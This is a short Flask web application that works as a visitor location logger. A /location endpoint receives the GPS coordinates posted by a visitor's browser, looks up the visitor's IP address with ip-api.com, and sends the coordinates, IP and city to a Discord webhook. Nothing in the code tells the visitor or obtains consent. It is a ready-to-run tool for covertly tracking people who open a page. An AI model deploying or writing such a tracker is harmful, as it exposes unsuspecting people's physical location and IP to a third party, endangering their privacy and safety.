from flask import Flask, request, jsonify, render_template
import requests
webhook_url = 'https://discord.com/api/webhooks/your_webhook_here'

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/location', methods=['POST'])
def get_location():
    data = request.json or {}
    ip = request.remote_addr

    ip_info = requests.get(f'http://ip-api.com/json/{ip}').json()

    msg = {
        "content": f"""
GPS: {data.get('lat')} , {data.get('lon')}
IP: {ip}
IP Location: {ip_info.get('city')}, {ip_info.get('country')} ({ip_info.get('lat')}, {ip_info.get('lon')})
"""
    }

    requests.post(webhook_url, json=msg)

    return jsonify({"status": "sent"})

if __name__ == '__main__':
    app.run()
